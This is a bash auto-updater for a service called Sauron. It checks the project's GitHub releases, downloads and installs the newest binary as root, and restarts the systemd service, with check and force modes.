#!/bin/bash
set -e

echo "🔄 Sauron Auto-Updater"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ This script must be run as root (use sudo)"
   exit 1
fi

# Function to get current installed version
get_current_version() {
    if [ -f "/usr/local/bin/sauron" ]; then
        /usr/local/bin/sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown"
    else
        echo "not-installed"
    fi
}

# Function to get latest GitHub release version
get_latest_version() {
    curl -s "https://api.github.com/repos/Skillz147/Sauron-Pro/releases/latest" | \
    grep '"tag_name":' | \
    sed -E 's/.*"([^"]+)".*/\1/' 2>/dev/null || echo "unknown"
}

# Function to download and extract latest release
download_latest_release() {
    local version="$1"
    local temp_dir="/tmp/sauron-update-$$"
    
    echo "📥 Downloading Sauron $version..." >&2
    mkdir -p "$temp_dir"
    cd "$temp_dir"
    
    # Download latest release
    if ! wget -q "https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz"; then
        echo "❌ Failed to download release" >&2
        rm -rf "$temp_dir"
        exit 1
    fi
    
    echo "📦 Extracting release..." >&2
    if ! tar -xzf sauron-linux-amd64.tar.gz; then
        echo "❌ Failed to extract release" >&2
        rm -rf "$temp_dir"
        exit 1
    fi
    
    # Check if binary exists in extracted files
    if [ ! -f "sauron/sauron" ]; then
        echo "❌ Binary not found in release package" >&2
        rm -rf "$temp_dir"
        exit 1
    fi
    
    echo "$temp_dir/sauron"
}

# Check for force flag
FORCE_UPDATE=false
if [ "$1" = "--force" ] || [ "$1" = "force" ]; then
    FORCE_UPDATE=true
    echo "🔄 Force update mode enabled"
fi

# Check for updates mode
if [ "$1" = "--check" ] || [ "$1" = "check" ]; then
    echo "🔍 Checking for updates..."
    
    current_version=$(get_current_version)
    latest_version=$(get_latest_version)
    
    echo "📊 Current version: $current_version"
    echo "📊 Latest version:  $latest_version"
    
    if [ "$current_version" = "$latest_version" ]; then
        echo "✅ You have the latest version!"
        exit 0
    elif [ "$latest_version" = "unknown" ]; then
        echo "⚠️  Unable to check for updates (network issue?)"
        exit 1
    else
        echo "🆕 Update available: $current_version → $latest_version"
        echo ""
        echo "Run 'sudo ./update-sauron.sh' to update automatically"
        exit 0
    fi
fi

# Auto-update mode (default)
echo "🔍 Checking for updates..."

current_version=$(get_current_version)
latest_version=$(get_latest_version)

echo "📊 Current version: $current_version"
echo "📊 Latest version:  $latest_version"

# Check if we're running from within the extracted directory (manual update)
if [ -f "./sauron" ] && [ "$FORCE_UPDATE" = false ]; then
    echo "📱 Using binary from current directory..."
    binary_source="./sauron"
    
    # When using local binary, get the version from it directly
    local_version=$(./sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown")
    echo "📊 Local binary version: $local_version"
    
    # Skip version comparison for local updates
    echo "ℹ️  Performing manual update with local binary..."
else
    if [ "$FORCE_UPDATE" = true ]; then
        echo "🔄 Force mode: Downloading latest version regardless of local binary"
    fi
    
    # Check if update is needed (unless force mode)
    if [ "$current_version" = "$latest_version" ] && [ "$latest_version" != "unknown" ] && [ "$FORCE_UPDATE" = false ]; then
        echo "✅ Already running the latest version ($current_version)"
        echo "🔍 Check status: systemctl status sauron"
        echo "💡 Use --force to reinstall anyway"
        exit 0
    fi

    if [ "$latest_version" = "unknown" ]; then
        echo "⚠️  Unable to fetch latest version from GitHub"
        echo "📋 Manual update steps:"
        echo "   1. Download: wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz"
        echo "   2. Extract: tar -xzf sauron-linux-amd64.tar.gz"
        echo "   3. Update: cd sauron && sudo ./update-sauron.sh"
        exit 1
    fi

    # Auto-download mode
    echo "🆕 Update available: $current_version → $latest_version"
    echo "📥 Downloading latest release automatically..."
    
    download_dir=$(download_latest_release "$latest_version")
    binary_source="$download_dir/sauron"
    
    # Cleanup function
    cleanup() {
        if [ -n "$download_dir" ] && [ -d "$download_dir" ]; then
            rm -rf "$download_dir"
        fi
    }
    trap cleanup EXIT
fi

# Stop service
echo "⏹️  Stopping Sauron service..."
if systemctl is-active sauron.service >/dev/null 2>&1; then
    systemctl stop sauron.service
    echo "✅ Service stopped"
else
    echo "ℹ️  Service was not running"
fi

# Backup current binary
if [ -f "/usr/local/bin/sauron" ]; then
    backup_file="/usr/local/bin/sauron.backup.$(date +%Y%m%d_%H%M%S)"
    echo "💾 Backing up current binary to $backup_file"
    cp /usr/local/bin/sauron "$backup_file"
fi

# Install new binary
echo "📦 Installing new binary..."
cp "$binary_source" /usr/local/bin/sauron
chmod +x /usr/local/bin/sauron

# Verify installation
new_version=$(/usr/local/bin/sauron --version 2>/dev/null | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+.*' || echo "unknown")
echo "✅ Installed version: $new_version"

# Restart service
echo "🚀 Starting Sauron service..."
systemctl start sauron.service

# Wait a moment and check status
sleep 2
if systemctl is-active sauron.service >/dev/null 2>&1; then
    echo "✅ Sauron updated successfully!"
    echo "📊 Updated: $current_version → $new_version"
else
    echo "❌ Service failed to start!"
    echo "🔍 Check logs: sudo journalctl -u sauron -f"
    exit 1
fi

echo ""
echo "🎯 Update Complete!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Status: systemctl status sauron"
echo "📋 Logs:   sudo journalctl -u sauron -f"
echo "🌐 Access: https://$(hostname -f)/admin"
